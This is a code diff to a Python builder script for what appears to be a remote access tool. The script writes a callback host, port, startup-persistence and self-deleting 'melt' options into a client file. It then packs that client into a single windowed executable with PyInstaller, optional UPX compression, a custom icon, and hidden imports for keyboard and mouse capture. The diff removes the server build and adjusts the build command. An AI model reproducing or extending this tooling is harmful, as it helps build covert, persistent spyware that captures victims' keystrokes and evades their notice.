@@ -27,8 +27,8 @@ def null_callback():
 
 
 def check_main_files():
-    if not (os.path.isfile("src/server.py") and os.path.isfile("src/client.py")):
-        tkinter.messagebox.showerror("Error", "Missing required files")
+    if not os.path.isfile("src/client.py"):
+        tkinter.messagebox.showerror("Error", "Missing src/client.py")
         sys.exit(0)
 
 
@@ -59,29 +59,26 @@ def get_pyinstaller():
     sys.exit(0)
 
 
-def save_files(client_args, server_args):
-    client_new_line = f"if __name__ == \"__main__\": Client({', '.join(client_args)}).start()"
-    server_new_line = f"if __name__ == \"__main__\": Server({', '.join(server_args)}).start()"
+def save_files(client_args):
+    client_new_line = f"if __name__ == \"__main__\": \n{4 * ' '}Client({', '.join(client_args)}).start()\n"
 
     main_match = "if __name__ == \"__main__\":"
 
-    _dict = {"src/server.py": server_new_line, "src/client.py": client_new_line}
-    for file_name in _dict:
-        file = open(file_name, "r")
-        file_contents = file.readlines()
-        file.close()
+    file = open("src/client.py", "r")
+    file_contents = file.readlines()
+    file.close()
 
-        i = 0
-        for i in range(0, len(file_contents)):
-            if file_contents[i][:len(main_match)] == main_match:
-                break
+    i = 0
+    for i in range(0, len(file_contents)):
+        if file_contents[i][:len(main_match)] == main_match:
+            break
 
-        file_contents = file_contents[:i]
-        file_contents.append(_dict[file_name])
+    file_contents = file_contents[:i]
+    file_contents.append(client_new_line)
 
-        file = open(file_name, "w")
-        file.writelines(file_contents)
-        file.close()
+    file = open("src/client.py", "w")
+    file.writelines(file_contents)
+    file.close()
 
 
 def check_windows():
@@ -220,9 +217,7 @@ class Setup:
             client_args = \
                 [f"'{self.host}'", str(port), str(self.is_hostname), str(self.add_startup), str(self.melt)]
 
-            server_args = [str(port)]
-
-            save_files(client_args, server_args)
+            save_files(client_args)
 
             upx_command = ""
             icon_command = ""
@@ -246,7 +241,7 @@ class Setup:
             command_arg = f"{self.pyinstaller} src/client.py {upx_command}--hidden-import pynput.keyboard._win32 " \
                           f"--hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl " \
                           f"--exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module " \
-                          f"Tkinter --onefile {windowed}{icon_command} "
+                          f"Tkinter --onefile {windowed}{icon_command} -y"
 
             def run_command():
                 self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
